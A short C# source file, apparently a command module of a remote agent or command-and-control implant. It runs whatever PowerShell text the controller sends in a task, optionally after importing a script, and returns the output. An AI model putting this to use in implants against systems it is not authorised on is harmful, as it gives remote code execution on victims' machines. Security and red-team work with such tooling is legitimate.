using Agent.Commands.Execution;
using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class PowerShellCommand : AgentCommand
    {
        public override string Name => "powershell";
        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
        {
            using (var runner = new PowerShellRunner())
            {

                if (!string.IsNullOrEmpty(PowerShellImportCommand.Script))
                    runner.ImportScript(PowerShellImportCommand.Script);

                var command = string.Join(" ", task.Arguments);
                result.Result = runner.Invoke(command);
                
            }
        }

    }
}
